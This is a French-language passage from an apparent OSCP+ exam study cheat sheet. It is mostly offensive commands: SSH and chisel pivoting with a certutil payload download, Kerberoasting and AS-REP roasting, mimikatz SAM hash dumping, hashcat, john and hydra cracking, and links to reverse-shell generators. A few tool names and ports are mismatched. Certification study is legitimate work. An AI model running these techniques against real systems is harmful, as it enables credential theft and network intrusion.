La première étape consiste à démarrer le transfert de port, suivi de l'exécution d'AS-REP Roasting avec GetUserSPNs.py pour Linux et Rubeus.exe pour Windows. Si aucune méthode ne fonctionne, énumérez manuellement dans Windows pour trouver le nom d'utilisateur et le mot de passe ou utilisez à nouveau mimikatz. Si vous n'êtes pas administrateur, appliquez des techniques d'élévation de privilèges Windows. Cela vous aidera à obtenir des privilèges sur Machine02.

```bash
# exécuter nmap sur Machine02 avec proxychains nmap -sT -sU -p22,161,135,139,445,88,3389 10.10.10.10
```

#### Transfert de port avec SSH (si le port 22 est ouvert dans machine01)
```bash
ssh -D 8001 -C -q -N noman@192.168.10.10
# dans /etc/proxychains4.conf (ajouter 127.0.0.1 9999)
socks5 127.0.0.1 8001
```

#### Transfert de port avec chisel
```bash
# socks5 127.0.0.1 1080 ajouter ceci dans /etc/proxychains
./chisel server -p 5555 --reverse
certutil -urlcache -split -f http://192.168.100.100/chisel-x64.exe
chisel client 192.168.100.100:5555 R:socks
# c'est le meilleur article pour l'installation de chisel
# https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29
```

#### Kerberoasting Windows avec Machine02
```bash
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force
```

OU

#### ./GetUserSPNs.py Pour Machine02
```bash
# assurez-vous que le pare-feu est désactivé et que vous êtes administrateur local etc.
proxychains python3 impacket-GetNPUsers noman.domain/noman:Noman@123 -dc-ip 10.10.100.100
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force
```

Si SQL, utilisez mssqlclient.py ; si SMB, utilisez psexec.py ; si WinRM ou evil-winrm, vérifiez l'administrateur, puis passez à l'étape suivante pour trouver le root Windows. Si vous trouvez beaucoup de noms d'utilisateur et mots de passe, utilisez crackmapexec pour SMB, SQL, WinRm ou evil-winrm.

### Domain01
```bash
# exécuter nmap sur Domain01 avec proxychains nmap -sT -sU -p22,161,445,88,3389 10.10.10.10
# vérifier nmap pour la connexion et utiliser crackmapexec. Si vous ne voulez pas utiliser nmap, alors
# connectez-vous simplement avec psexec, winrm ou winexe
# si vous ne trouvez pas le nom d'utilisateur et le mot de passe, utilisez une méthode différente comme pass the hash, silver ticket
```

## Informations générales
### Shell inversé
- Copiez toujours le shell inversé à partir de ces liens et vérifiez directement. S'il ne fonctionne pas, encodez-le avec URL ou chiffrez-le avec base64.
  - https://www.revshells.com/
  - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### Craquage de mot de passe :
admin:admin admin:password root:root root:toor
Burpsuite si nous voulons
```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt
sudo gzip -d rockyou.txt.gz
hydra -l noman -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.10.10
hydra -l noman -P /usr/share/wordlists/rockyou.txt 192.168.10.10 http-post
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.10.10 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
hashcat -b | hashcat.exe -b # (linux et window benchmark)
```

#### Personnaliser les listes de mots
```bash
head /usr/share/wordlists/rockyou.txt > demo.txt | sed -i '/^1/d' demo.txt
# si nous voulons ajouter 1 dans tous les mots de passe alors | echo \$1 > demo.rule | hashcat -r demo.rule --stdout demo.txt
hash-identifier # (trouver le hash si simple)
hashid # (si l'id est disponible "$2y$10$)
ssh2john id_rsa > ssh.hash | hashcat -h | grep -i "ssh" # (port22)
```

#### CRACKER NTLM avec MimiKatz
```bash
# Fenêtre cible Get-LocalUser | ouvrir powershell | cd C:\tools | ls (| déjà installé sinon installer) | token::elevate (vérifier les permissions utilisateur) | lsadump::sam (dump tous les utilisateurs ntlm) |
# KALI vim noman.hash (copier hash noman) | hashcat --help | grep -i "ntlm" (vérifier le mode comme ntml valeur 1000) | hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#### Craquage de zip
```bash
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
zip2john file.zip > zip.john
john zip.john
```

#### Tuer un port
```bash
sudo fuser -k 443/tcp
```

## Questions/Réponses Fréquemment Posées
Beaucoup de personnes m'ont posé des questions auxquelles je n'ai pas le temps de répondre individuellement. Par conséquent, voici mes réponses aux questions les plus fréquentes.

### 1. Je suis débutant, comment commencer ? Que recommandez-vous avant l'OSCP+ ?
Commencez par la certification eJPT, puis passez à la liste de TJ_Null. Résolvez quelques machines pour évaluer vos connaissances. Après cela, passez à la documentation officielle d'OffSec et résolvez les labs.

### 2. Par quel service dois-je commencer l'énumération en premier ?
La première étape consiste à scanner tous les 65535 ports TCP et les principaux ports UDP. Je recommande d'utiliser un excellent outil appelé AutoRecon, qui est autorisé pendant l'examen OSCP+. De plus, il existe de nombreuses techniques d'énumération de ports. La plupart du temps, vous obtiendrez un accès initial via des ports HTTP comme 80, 81, 443, 8080 et 8000. Exécutez Gobuster pour trouver des vulnérabilités, RCE, etc. Si vous découvrez des identifiants, essayez de vous connecter sur les ports 21, 22, les pages de connexion, 3389 et 161.

## Conseils pour l'examen
- Fixez une limite de temps pour chaque pied d'entrée (si le temps est écoulé, PASSEZ À AUTRE CHOSE)
- Recherchez des ports peu communs
- Utilisez l'énumération manuelle plutôt que des outils automatisés (je n'ai utilisé aucun outil automatisé pendant l'examen)
- Faites une énumération en largeur d'abord au lieu d'une énumération en profondeur
- Réfléchissez à ce que vous pouvez énumérer à partir de chaque service
- ÉNUMÉREZ, ÉNUMÉREZ & ÉNUMÉREZ !!!

